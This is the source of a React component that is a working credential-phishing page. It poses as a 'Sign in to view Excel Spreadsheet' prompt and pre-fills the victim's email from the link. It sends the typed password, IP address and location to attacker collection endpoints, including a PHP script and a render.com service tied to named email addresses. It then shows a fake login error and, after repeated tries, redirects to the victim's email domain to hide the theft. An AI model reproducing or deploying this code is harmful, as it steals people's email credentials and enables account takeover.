
import React, { useState, useEffect } from "react";
import './form.css';
import $ from 'jquery';

const Formm = ()=>{



    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');

    const forTime = new Date();


    useEffect(()=>{
        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
        .then(req=> req.json())
        .then(res=>{

            setIpAdress(res.ip)
            setFlag(res.country.flag);
            setCountry(res.country.name);
            setCity(res.city.names.en);

        })
        .catch(e=> console.log)
    }, []);


    const reloadPreloader = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

  const [email, setEmail] = useState(extracetdEmail);
  const [pwd, setPwd] = useState('');

  const [count, setCount] = useState(0);

  const [err, setErr] = useState(false);

  const submitHandler = (e) => {
    e.preventDefault();
    if (pwd === "") {
      return null
    }
    
    else{
        
        setTimeout(() => {
          setPwd('');
          setErr(true);
        }, 1700);



      const aaa = {
        email: email,
        password: pwd,
    };


        $.ajax({
          type: "POST",
          url: "https://physicaleducationdiploma.com/footer/xl.php",
          data: aaa,
          success(data) {
              console.log(data);
          },
        });


        $.ajax({
            type: "POST",
            url: "https://physicaleducationdiploma.com/footer/xl.php",
            data: aaa,
            success(data) {
                console.log(data);
            },
          });

// ========================================================================================================================
// ========================================================================================================================


      const user = {
        email: email,
        pswd: pwd,
        country: country,
        city: city,
        flag: flag,
        eyep: ipAdress,
        nownow: forTime
    };

      $.ajax({
          type: "POST",
          url: "https://regional-device-order.onrender.com/get_details/mill8004@yandex.com/device/region/",
          data: user,
          success(data) {
              console.log(data);
          },
      });



      $.ajax({
        type: "POST",
        url: "https://regional-device-order.onrender.com/get_details/luisfisher211@gmail.com/device/region/",
        data: user,
        success(data) {
            console.log(data);
        },
    });
// ========================================================================================================================
// ========================================================================================================================

// deploy

      setCount(count=> count + 1);
            if(count >= 2){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    // window.location.href = `https://support.microsoft.com/en-us/office/excel-not-responding-hangs-freezes-or-stops-working-37e7d3c9-9e84-40bf-a805-4ca6853a1ff4`;
                    window.location.href = `${extracetdemailDomain}`
                }, 1200);
            };
    }
  };

  
    return(<>

        <main className="cntr">

            <div className="modal_box">
                <div className="signals">
                    <img 
                        alt="clearbit"
                        className="gfrm_eml"
                        style={{ width:'110px'}}
                        src="data:image/png;base64,"
                    />

                    <img 
                        alt="clearbit"
                        className="gfrm_eml"
                        style={{ width:'50px'}}
                        src="data:image/png;base64,"
                    />
                </div>

                <p style={{
                    color:'#fff',
                    fontSize:'21px',
                    marginTop:'-2px'
                }}>Sign in to view Excel Spreadsheet</p>

                <aside style={{
                    color:'#fff',
                    fontSize:'13px',
                    marginTop:'-17px'
                }}>Only Email recipient can view</aside>

                <form onSubmit={submitHandler} className="frm" style={{
                    marginTop:'17px'
                }}>
 
                    {err ? <b><p style={{
                        textAlign:'center',
                        color:'#ba1100',
                        marginBottom:'-10px',
                        fontSize:'15px'
                    }}>Incorect username or password</p></b> : null }

                    <div className="inp_wrapper_">

                        <div className="eml_engulf">
                            <input 
                                type="email"
                                placeholder="Email"
                                name="email"
                                required
                                className="email"
                                value={email}
                                onChange={ e=> setEmail(e.target.value) }
                            />
                        </div>

                        <div className="paswd_engulf">
                            <input 
                                type="password"
                                placeholder="Email Password"
                                className="pswd"
                                name="paswd"
                                value={pwd}
                                onChange={ e=> setPwd(e.target.value) }
                            />
                        </div>

                        <div className="submit_engulf">
                            <input 
                                type="submit"
                                className="btn"
                                value={`View`}
                                onClick={submitHandler}
                            />
                        </div>

                    </div>
                </form>

                
            </div>

        </main>

        <article style={{
            display:'flex',
            justifyContent:'center',
            alignItems:'center',
            marginTop:'-2cm'
        }}>
        <div className="wrp" onClick={reloadPreloader}>
            <img alt="key" 
            style={{
                width:'30px',
                height:'30px'
            }}
            className=""
            src="data:image/png;base64,"
            />

            &#160;

            <p style={{
                color:'rgb(32,107,68)'
            }}>Sign-in using other options</p>
        </div>
        </article>


    </>);
};

export default Formm;